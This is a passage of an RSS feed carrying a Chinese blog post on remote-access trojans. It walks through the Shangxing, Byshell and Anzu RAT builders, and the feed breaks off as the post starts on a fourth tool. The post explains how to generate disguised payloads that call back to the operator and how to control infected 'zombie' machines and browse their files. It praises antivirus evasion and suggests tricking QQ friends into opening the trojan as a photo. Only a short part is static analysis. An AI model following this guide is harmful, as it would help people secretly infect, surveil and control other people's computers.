<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>渗透测试 &#8211; 有组织在!</title>
	<atom:link href="https://uzzz.org/category/shentouceshi/feed" rel="self" type="application/rss+xml" />
	<link>https://uzzz.org/</link>
	<description></description>
	<lastBuildDate>Sun, 25 Aug 2019 18:12:03 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.2.4</generator>

<image>
	<url>https://uzzz.org/wp-content/uploads/2019/10/cropped-icon-32x32.png</url>
	<title>渗透测试 &#8211; 有组织在!</title>
	<link>https://uzzz.org/</link>
	<width>32</width>
	<height>32</height>
</image> 
	<item>
		<title>后渗透篇：远控木马</title>
		<link>https://uzzz.org/article/2530.html</link>
				<pubDate>Sun, 25 Aug 2019 18:12:03 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[渗透测试]]></category>
		<category><![CDATA[资讯]]></category>

		<guid isPermaLink="false">https://uzzz.org/article/2530.html</guid>
				<description><![CDATA[当你的才华 还撑不起你的野心时 那你就应该静下心来学习 目录 远控木马 0x01 上兴远程控制使用测试 1.1 木马的生成 1.2 木马的控制 0x02 上兴远程控制分析 2.1服务器端的静态分析 0x03 穿透力极强的Byshell木马 0x04 上线速度超快的暗组远控木马 0x05&#160;新兴的东南网安远程控制软件 0x06 黑客防线新一代远控pcshare 0x07&#160;盗版灰鸽子——落学远程协助系统 &#160; &#160; &#160; 网上摘抄了几篇文章介绍远控木马软件的，自己也顺便做个记录。 &#160; &#160; &#160; 参考链接： &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;http://edu.qudong.com/2008/0411/6956.shtml &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;https://www.cnblogs.com/20179203li/p/7806650.html &#160; &#160;&#160; 远控木马 　　远控木马是一种恶意程序，其中包括在目标计算机上用于管理控制的后门。远程访问木马通常与用户请求的程序（如游戏程序）一起，是一种看不见的下载，或作为电子邮件附件发送。一旦主机系统被攻破，入侵者可以利用它来向其他易受感染的计算机分发远程访问木马，从而建立僵尸网络。 一般分为客户端和服务端，如：灰鸽子、上兴远控、梦想时代、QuasarRAT等。 &#160; 0x01 上兴远程控制使用测试 本次实验是在win XP SP3的虚拟机上完成的。 1.1 木马的生成 &#160; &#160; &#160; 这个软件的主要原理就是生成一个木马，并将这个木马伪装成一个正常的安装包，当有人点开它之后，它可以伪装成进程，服务避免杀毒软件的查杀，下图是它的生成界面。 可以看到几个特征：&#160; &#160; &#160; 1)需要输入本机的准确IP地址和上线端口号，确定控制信息的回传&#160; &#160; &#160; 2)可以选择木马的运行方式，以及生成程序是否加壳，加壳主要是为了应对破解而进行的&#160; &#160; &#160; 3)可以对文件的样式，服务类型等信息进行自定义 1.2 木马的控制 &#160; &#160; &#160; 本小节介绍一下这个木马程序都可以实现什么样的远程控制。当有中了木马的主机开机之后，我们所在的客户端会提示有主机上线，可以对相应主机实现控制。 &#160; 0x02 上兴远程控制分析 2.1服务器端的静态分析 1)分析是否有壳 &#160; &#160; &#160; 在这里我使用的查壳工具是PEID进行查壳检验。&#160; &#160; &#160; 首先分析这个生成的服务器端木马程序是否有壳，下面这张图是无壳时的显示： &#160; &#160; &#160; 可以看到图中分析出了编写这个木马程序所用的语言:delphi语言 当我生成一个有壳的木马程序进行检测时，结果如下： &#160; &#160; &#160; 可以看到查壳的结果是Nothing found *，上网查询结果表示，当前的特征壳库中没有找到类似的壳，所以不知道这个壳是什么。 2)静态反汇编 &#160; &#160; &#160; 接着使用IDA pro对木马程序进行静态反汇编，查看该木马的汇编代码。在这里我直接查看的是不加壳的木马程序，加壳的木马程序首先需要去壳破解才能成功的看到其汇编代码，去壳的破解方法还不怎么会，因此暂时跳过。 &#160; &#160; &#160; &#160; &#160; 喜欢在网上浏览新闻的人，一定会经常看到某人隐私被黑客盗窃，或者以此来要挟受害人的事情。这里大家可能要问了，他们是如何做到的呢?其实答案很简单，只不过是利用了远程木马控制实现，下面笔者将会针对黑客圈子里，常见的远程木马进行详细讲解。 &#160; 0x03 穿透力极强的Byshell木马 &#160; &#160; &#160; Byshell是一个无进程、无DLL、无启动项的、集多种Rootkit技术特征的独立功能远程控制后门程序(Backdoor)。其利用线程注射DLL到系统进程，解除DLL映射并删除自身文件和启动项，关机时恢复。它是内核级的木马程序，主要部分工作在Ring0，因此有很强的隐蔽性和杀伤力。 1.配置Byshell木马服务端 &#160; &#160; &#160; 要想配置Byshell木马服务端，我们首先打开下载到本地的“Byshell客户端”程序，在所弹出的“监听端口”对话框内，输入其木马想要监听的端口，默认设置为2007(如图1)。 &#160; &#160; &#160; &#160; 修改完毕后，进入到“Byshell木马客户端”界面，在顶端的工具栏内，单击“配置服务端”按钮，此时就会打开“配置服务端”的对话框(如图2)。 &#160; &#160; &#160; &#160; 在“IP通知地址”标签处，输入自己空间的访问地址，“IP或者DNS域名”标签，则输入自己的本机IP，另外客户端口输入的数字，要与此前设置的监听端口一致，否则会出现肉鸡无法上线的情况。然后在单击“生成”按钮，在弹出的“另存为”对话框内，选择好所要生成的路径，单击“确定”按钮，就可使其服务端生成完毕。 2.让主动防御纷纷落马 &#160; &#160; &#160; 为了能够测试Byshell木马的威力，我们这里打开杀毒软件的所有“主动防御”选项，并且将其安全级别提高到最高，然后在运行一下刚生成好的Byshell木马服务端，此时你会发现杀毒软件竟然将它的启动视而不见，并且在客户端还可以看到中招的机器上线。如果你想对肉鸡进行控制，我们可以选择其上线的机器，然后在上方单击工具栏里的“相关”按钮，如这里单击“文件管理”按钮，就可打开被控制机器的“文件管理”对话框，从中我们可以查阅该肉鸡里的所有硬盘文件。另外最后要想卸载掉远程服务端，只要在“客户端”界面内，右击上线肉鸡IP栏，选择“远程卸载”选项，就可将其服务端从受害者系统里摘除。 &#160; &#160; &#160; 总结：其实Byshell木马通过对当前系统的SSDT表进行破坏，所使用系统原来的SSDT表覆盖现在的SSDT表，才使杀毒软件的主动防御功能实效的。如果你想从数据上了解Byshell木马的穿透，可以使用Wsyscheck等工具查看系统中的SSDT表，这样就会清楚的看见杀毒软件在正常情况下，与被木马穿透的表是不同的了。 &#160; 0x04 上线速度超快的暗组远控木马 &#160; &#160; &#160; 暗组远控木马，是一款体积非常小的控制软件，并且它还具备着较强的穿透防火墙和杀毒软件的主动防御能力。另外由于这款软件很偏门，一般人都不太知道，所以其所生成的最新服务端，无须进行加密就可以逃脱一些杀毒软件的查杀。 1. 利用客户端生成服务端 &#160; &#160; &#160; 由于暗组远控软件功能不是很强大，所以客户端界面很简单，主要有顶端三个功能按钮，如：“生成服务端、设置、监听”按钮构成，很适合新手操作。另外暗组远控木马与其他同类软件一样，也是通过其客户端来生成服务端。这里我们依然在其客户端界面内，单击“生成服务端”按钮，此时在弹出的“生成服务端”对话框内(如图3)。 &#160; &#160; &#160; &#160; 新手只要在上线域名那里换成自己的固定IP地址，然后单击“生成”按钮，选择好保存路径就可将其生成成功了。 2. 偏门木马杀毒软件不易发现 &#160; &#160; &#160; 之前笔者已经说过了，貌似这种不出名的木马，即使有时不加密也不会被查杀掉，而像灰鸽子、黑洞等名声在外的木马，即使加密也用不了多久。因此我们只要通过欺骗QQ好友看照片的手段，让他(她)运行配置好的木马服务端，然后单击“开始监听”按钮，其主机就会立刻在客户端上线了(如图4)。 &#160; &#160; &#160; 此时你只要选择该上线的肉鸡，就可以对相关肉鸡进行远程控制，而具体控制功能都集成在了右键上面，大家可以根据需要进行选择即可。 &#160;]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <!--一个博主专栏付费入口--><br />
 <!--一个博主专栏付费入口结束-->
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-d284373521.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-d284373521.css">
<div class="htmledit_views" id="content_views">
<hr>
<p>当你的才华</p>
<p>还撑不起你的野心时</p>
<p>那你就应该静下心来学习</p>
<hr>
<p><strong>目录</strong></p>
<p id="%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC-toc" style="margin-left:0px;"><a href="#%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC" rel="nofollow" data-token="d8371b82c7865bbabaa22fb5b288f5ce">远控木马</a></p>
<p id="一上兴远程控制使用测试-toc" style="margin-left:40px;"><a href="#%E4%B8%80%E4%B8%8A%E5%85%B4%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%BD%BF%E7%94%A8%E6%B5%8B%E8%AF%95" rel="nofollow" data-token="b2eef29311820e87eddb4a8ba152717e">0x01 上兴远程控制使用测试</a></p>
<p id="木马的生成-toc" style="margin-left:80px;"><a href="#%E6%9C%A8%E9%A9%AC%E7%9A%84%E7%94%9F%E6%88%90" rel="nofollow" data-token="eb0cd9770f2491d1b3a1f9b636406045">1.1 木马的生成</a></p>
<p id="木马的控制-toc" style="margin-left:80px;"><a href="#%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%8E%A7%E5%88%B6" rel="nofollow" data-token="b9a99611388f9cab45bc62545e68cb1d">1.2 木马的控制</a></p>
<p id="二上兴远程控制分析-toc" style="margin-left:40px;"><a href="#%E4%BA%8C%E4%B8%8A%E5%85%B4%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%88%86%E6%9E%90" rel="nofollow" data-token="5f9b10e6da1259949d78986b3d8dbbff">0x02 上兴远程控制分析</a></p>
<p id="服务器端的静态分析-toc" style="margin-left:80px;"><a href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%9A%84%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90" rel="nofollow" data-token="89d678fcd4cad9a7ef2ca9b768427373">2.1服务器端的静态分析</a></p>
<p id="0x03%20%E7%A9%BF%E9%80%8F%E5%8A%9B%E6%9E%81%E5%BC%BA%E7%9A%84Byshell%E6%9C%A8%E9%A9%AC-toc" style="margin-left:40px;"><a href="#0x03%20%E7%A9%BF%E9%80%8F%E5%8A%9B%E6%9E%81%E5%BC%BA%E7%9A%84Byshell%E6%9C%A8%E9%A9%AC" rel="nofollow" data-token="2cd63a924a7bb3507a2ce31799bf82cd">0x03 穿透力极强的Byshell木马</a></p>
<p id="0x04%20%E4%B8%8A%E7%BA%BF%E9%80%9F%E5%BA%A6%E8%B6%85%E5%BF%AB%E7%9A%84%E6%9A%97%E7%BB%84%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC-toc" style="margin-left:40px;"><a href="#0x04%20%E4%B8%8A%E7%BA%BF%E9%80%9F%E5%BA%A6%E8%B6%85%E5%BF%AB%E7%9A%84%E6%9A%97%E7%BB%84%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC" rel="nofollow" data-token="3ece748f69252bcc491778832f50cb78">0x04 上线速度超快的暗组远控木马</a></p>
<p id="0x05%C2%A0%E6%96%B0%E5%85%B4%E7%9A%84%E4%B8%9C%E5%8D%97%E7%BD%91%E5%AE%89%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E8%BD%AF%E4%BB%B6-toc" style="margin-left:40px;"><a href="#0x05%C2%A0%E6%96%B0%E5%85%B4%E7%9A%84%E4%B8%9C%E5%8D%97%E7%BD%91%E5%AE%89%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E8%BD%AF%E4%BB%B6" rel="nofollow" data-token="bb4fa37cec82458e5fcb1b2f935fd8ff">0x05&nbsp;新兴的东南网安远程控制软件</a></p>
<p id="0x06%20%E9%BB%91%E5%AE%A2%E9%98%B2%E7%BA%BF%E6%96%B0%E4%B8%80%E4%BB%A3%E8%BF%9C%E6%8E%A7pcshare-toc" style="margin-left:40px;"><a href="#0x06%20%E9%BB%91%E5%AE%A2%E9%98%B2%E7%BA%BF%E6%96%B0%E4%B8%80%E4%BB%A3%E8%BF%9C%E6%8E%A7pcshare" rel="nofollow" data-token="b62f74c960341a6fee22ff8cd133429a">0x06 黑客防线新一代远控pcshare</a></p>
<p id="0x07%C2%A0%E7%9B%97%E7%89%88%E7%81%B0%E9%B8%BD%E5%AD%90%E2%80%94%E2%80%94%E8%90%BD%E5%AD%A6%E8%BF%9C%E7%A8%8B%E5%8D%8F%E5%8A%A9%E7%B3%BB%E7%BB%9F-toc" style="margin-left:40px;"><a href="#0x07%C2%A0%E7%9B%97%E7%89%88%E7%81%B0%E9%B8%BD%E5%AD%90%E2%80%94%E2%80%94%E8%90%BD%E5%AD%A6%E8%BF%9C%E7%A8%8B%E5%8D%8F%E5%8A%A9%E7%B3%BB%E7%BB%9F" rel="nofollow" data-token="d92364434abdfc997fd0701a0990b708">0x07&nbsp;盗版灰鸽子——落学远程协助系统</a></p>
<hr id="hr-toc">
<p>&nbsp; &nbsp; &nbsp; 网上摘抄了几篇文章介绍远控木马软件的，自己也顺便做个记录。</p>
<p>&nbsp; &nbsp; &nbsp; 参考链接：</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a href="http://edu.qudong.com/2008/0411/6956.shtml" rel="nofollow" data-token="245ebc254ad8c454470a28d55244d44b">http://edu.qudong.com/2008/0411/6956.shtml</a></p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a href="https://www.cnblogs.com/20179203li/p/7806650.html" rel="nofollow" data-token="8ad53cd66a887679bf4568e9b7c0d8b1">https://www.cnblogs.com/20179203li/p/7806650.html</a></p>
<h1>&nbsp; &nbsp;&nbsp;</h1>
<h1 id="%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC">远控木马</h1>
<p>　　远控木马是一种恶意程序，其中包括在目标计算机上用于管理控制的后门。远程访问木马通常与用户请求的程序（如游戏程序）一起，是一种看不见的下载，或作为电子邮件附件发送。一旦主机系统被攻破，入侵者可以利用它来向其他易受感染的计算机分发远程访问木马，从而建立僵尸网络。</p>
<p><strong>一般分为客户端和服务端，<span style="color:#f33b45;">如：灰鸽子、上兴远控、梦想时代、QuasarRAT等。</span></strong></p>
<h1>&nbsp;</h1>
<h2 id="一上兴远程控制使用测试">0x01 上兴远程控制使用测试</h2>
<p>本次实验是在win XP SP3的虚拟机上完成的。</p>
<h3 id="木马的生成">1.1 木马的生成</h3>
<p><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span></span>这个软件的主要原理就是生成一个木马，并将这个木马伪装成一个正常的安装包，当有人点开它之后，它可以伪装成进程，服务避免杀毒软件的查杀，下图是它的生成界面。</p>
<p><img alt="" class="has" height="598" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/2019082412421072.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="585"></p>
<p>可以看到几个特征：<br /><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span></span>1)需要输入本机的准确IP地址和上线端口号，确定控制信息的回传<br /><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span></span>2)可以选择木马的运行方式，以及生成程序是否加壳，加壳主要是为了应对破解而进行的<br /><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span></span>3)可以对文件的样式，服务类型等信息进行自定义</p>
<h3 id="木马的控制">1.2 木马的控制</h3>
<p><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span></span>本小节介绍一下这个木马程序都可以实现什么样的远程控制。当有中了木马的主机开机之后，我们所在的客户端会提示有主机上线，可以对相应主机实现控制。</p>
<p><img alt="" class="has" height="689" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824124303832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="998"></p>
<h1>&nbsp;</h1>
<h2 id="二上兴远程控制分析">0x02 上兴远程控制分析</h2>
<h3 id="服务器端的静态分析">2.1服务器端的静态分析</h3>
<p id="分析是否有壳"><strong>1)分析是否有壳</strong></p>
<p><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span></span>在这里我使用的查壳工具是PEID进行查壳检验。<br /><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span></span>首先分析这个生成的服务器端木马程序是否有壳，下面这张图是无壳时的显示：</p>
<p><img alt="" class="has" height="343" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824124451890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="562"></p>
<p><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span></span>可以看到图中分析出了编写这个木马程序所用的语言:delphi语言<br /> 当我生成一个有壳的木马程序进行检测时，结果如下：</p>
<p><img alt="" class="has" height="336" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824124507667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="568"></p>
<p><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span></span>可以看到查壳的结果是Nothing found *，上网查询结果表示，当前的特征壳库中没有找到类似的壳，所以不知道这个壳是什么。</p>
<p id="静态反汇编"><strong>2)静态反汇编</strong></p>
<p><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span></span>接着使用IDA pro对木马程序进行静态反汇编，查看该木马的汇编代码。在这里我直接查看的是不加壳的木马程序，加壳的木马程序首先需要去壳破解才能成功的看到其汇编代码，去壳的破解方法还不怎么会，因此暂时跳过。</p>
<p><img alt="" class="has" height="675" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/2019082412452517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="1080"></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span>喜欢在网上浏览新闻的人，一定会经常看到某人隐私被黑客盗窃，或者以此来要挟受害人的事情。这里大家可能要问了，他们是如何做到的呢?其实答案很简单，只不过是利用了远程木马控制实现，下面笔者将会针对黑客圈子里，常见的远程木马进行详细讲解。</span></p>
<p>&nbsp;</p>
<h2 id="0x03%20%E7%A9%BF%E9%80%8F%E5%8A%9B%E6%9E%81%E5%BC%BA%E7%9A%84Byshell%E6%9C%A8%E9%A9%AC" style="margin-left:0px;"><span style="color:#666666;"><span style="color:#333333;"><strong>0x03 穿透力极强的Byshell木马</strong></span></span></h2>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">Byshell是一个无进程、无DLL、无启动项的、集多种Rootkit技术特征的独立功能远程控制后门程序(Backdoor)。其利用线程注射DLL到系统进程，解除DLL映射并删除自身文件和启动项，关机时恢复。它是内核级的木马程序，主要部分工作在Ring0，因此有很强的隐蔽性和杀伤力。</span></span></p>
<p style="margin-left:0px;"><img alt="" class="has" height="152" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824124836747.png" width="391"></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#333333;"><strong>1.配置Byshell木马服务端</strong></span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">要想配置Byshell木马服务端，我们首先打开下载到本地的“Byshell客户端”程序，在所弹出的“监听端口”对话框内，输入其木马想要监听的端口，默认设置为2007(如图1)。</span></span></p>
<p style="margin-left:0px;"><img alt="" class="has" height="308" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824124848346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="639"></p>
<p style="margin-left:0px;">&nbsp;</p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">修改完毕后，进入到“Byshell木马客户端”界面，在顶端的工具栏内，单击“配置服务端”按钮，此时就会打开“配置服务端”的对话框(如图2)。</span></span></p>
<p style="margin-left:0px;">&nbsp;</p>
<p style="margin-left:0px;"><img alt="" class="has" height="297" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824124903335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="627"></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">在“IP通知地址”标签处，输入自己空间的访问地址，“IP或者DNS域名”标签，则输入自己的本机IP，另外客户端口输入的数字，要与此前设置的监听端口一致，否则会出现肉鸡无法上线的情况。然后在单击“生成”按钮，在弹出的“另存为”对话框内，选择好所要生成的路径，单击“确定”按钮，就可使其服务端生成完毕。</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#333333;"><strong>2.让主动防御纷纷落马</strong></span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">为了能够测试Byshell木马的威力，我们这里打开杀毒软件的所有“主动防御”选项，并且将其安全级别提高到最高，然后在运行一下刚生成好的Byshell木马服务端，此时你会发现杀毒软件竟然将它的启动视而不见，并且在客户端还可以看到中招的机器上线。如果你想对肉鸡进行控制，我们可以选择其上线的机器，然后在上方单击工具栏里的“相关”按钮，如这里单击“文件管理”按钮，就可打开被控制机器的“文件管理”对话框，从中我们可以查阅该肉鸡里的所有硬盘文件。另外最后要想卸载掉远程服务端，只要在“客户端”界面内，右击上线肉鸡IP栏，选择“远程卸载”选项，就可将其服务端从受害者系统里摘除。</span></span></p>
<p><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp;</span></span></span></span><span style="color:#f33b45;"><strong> &nbsp; 总结：</strong></span><span style="color:#666666;"><span style="color:#666666;">其实Byshell木马通过对当前系统的SSDT表进行破坏，所使用系统原来的SSDT表覆盖现在的SSDT表，才使杀毒软件的主动防御功能实效的。如果你想从数据上了解Byshell木马的穿透，可以使用Wsyscheck等工具查看系统中的SSDT表，这样就会清楚的看见杀毒软件在正常情况下，与被木马穿透的表是不同的了。</span></span></p>
<p>&nbsp;</p>
<h2 id="0x04%20%E4%B8%8A%E7%BA%BF%E9%80%9F%E5%BA%A6%E8%B6%85%E5%BF%AB%E7%9A%84%E6%9A%97%E7%BB%84%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC" style="margin-left:0px;"><span style="color:#666666;"><span style="color:#333333;"><strong>0x04 上线速度超快的暗组远控木马</strong></span></span></h2>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">暗组远控木马，是一款体积非常小的控制软件，并且它还具备着较强的穿透防火墙和杀毒软件的主动防御能力。另外由于这款软件很偏门，一般人都不太知道，所以其所生成的最新服务端，无须进行加密就可以逃脱一些杀毒软件的查杀。</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#333333;"><strong>1. 利用客户端生成服务端</strong></span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">由于暗组远控软件功能不是很强大，所以客户端界面很简单，主要有顶端三个功能按钮，如：“生成服务端、设置、监听”按钮构成，很适合新手操作。另外暗组远控木马与其他同类软件一样，也是通过其客户端来生成服务端。这里我们依然在其客户端界面内，单击“生成服务端”按钮，此时在弹出的“生成服务端”对话框内(如图3)。</span></span></p>
<p style="margin-left:0px;">&nbsp;</p>
<p style="margin-left:0px;"><img alt="" class="has" height="627" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824124918849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="506"></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">新手只要在上线域名那里换成自己的固定IP地址，然后单击“生成”按钮，选择好保存路径就可将其生成成功了。</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#333333;"><strong>2. 偏门木马杀毒软件不易发现</strong></span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">之前笔者已经说过了，貌似这种不出名的木马，即使有时不加密也不会被查杀掉，而像灰鸽子、黑洞等名声在外的木马，即使加密也用不了多久。因此我们只要通过欺骗QQ好友看照片的手段，让他(她)运行配置好的木马服务端，然后单击“开始监听”按钮，其主机就会立刻在客户端上线了(如图4)。</span></span></p>
<p style="margin-left:0px;"><img alt="" class="has" height="445" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824124935101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="631"></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">此时你只要选择该上线的肉鸡，就可以对相关肉鸡进行远程控制，而具体控制功能都集成在了右键上面，大家可以根据需要进行选择即可。</span></span></p>
<p><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; </span></span></span></span><strong><span style="color:#f33b45;">&nbsp; 总结：</span></strong><span style="color:#666666;"><span style="color:#666666;">暗组远控木马与Rdmin差不多，其不仅可以观看到操作者的一举一动，就连其桌面的也可一同进行控制，这要比前者介绍的Byshell好的多。另外如果你想为自己的网站刷流量，还可以通过右键启动看看增加批量打开网站，从而可以为自己的网站获取更多的点击率。</span></span></p>
<p>&nbsp;</p>
<h2 id="0x05%C2%A0%E6%96%B0%E5%85%B4%E7%9A%84%E4%B8%9C%E5%8D%97%E7%BD%91%E5%AE%89%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E8%BD%AF%E4%BB%B6"><strong>0x05&nbsp;新兴的东南网安远程控制软件</strong></h2>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">东南网安远程控制是由东南大学网络安全联盟，开发的一款远程控制软件，其界面友好简单，左侧有一排错落有致的功能按钮，我要想对肉鸡进行控制，只需使用这几个按钮便可完成操作(如图5)。#p#分页标题#e#</span></span></p>
<p style="margin-left:0px;"><img alt="" class="has" height="490" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824124947508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="626"></p>
